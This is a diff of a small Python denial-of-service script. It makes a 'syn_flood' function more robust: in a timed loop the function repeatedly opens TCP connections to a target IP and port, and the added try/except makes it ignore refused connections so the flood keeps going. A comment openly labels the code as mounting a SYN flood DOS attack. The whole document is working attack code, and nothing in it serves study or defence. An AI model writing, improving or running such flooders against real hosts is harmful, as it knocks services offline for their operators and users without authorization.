@@ -1,12 +1,9 @@
-
-
 import socket
 import sys
 import time
 
-
+# Mounts a SYN flood DOS attack on specified target for a specified time
 def syn_flood(target_ip, port, t):
-
 	begin = time.time()
 	count = 0
 
@@ -17,14 +14,18 @@ def syn_flood(target_ip, port, t):
 
 		# Check for attack lasting a specific length
 		if end - begin > t:
-			print("Sent %d packets" % (count))
+			print("Sent %d SYN packets" % (count))
 			exit()
 
 		# Send Packets
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target_ip, port))
-		count = count + 1
+		try:
+			count = count + 1
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target_ip, port))
 
+		# Ignore exceptions from packet denial
+		except:
+			pass
 
 
 # Main for testing individual library function
